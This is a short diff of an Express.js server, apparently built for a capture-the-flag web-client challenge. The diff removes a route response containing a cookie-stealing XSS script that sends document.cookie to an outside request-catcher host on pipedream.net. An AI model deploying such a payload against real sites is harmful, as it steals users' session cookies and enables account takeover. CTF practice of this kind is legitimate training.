@@ -20,11 +20,11 @@ app.use(bodyParser.urlencoded({limit: "10mb", extended: true}))
  
 //test sur la page principal
 app.get("/", (req, res) => {
-    res.render("<h1>meow</h1>")
+    res.render("color.js")
 })
 
 app.get("/web-client/ch62/color.js", (req, res) => {
-    res.render(`<script>document.location = 'https://eocvkn4m3kpce3q.m.pipedream.net' + '?cookies=' + document.cookie;console.log("meow");</script>`)
+    res.render("color.js")
 })
 
 
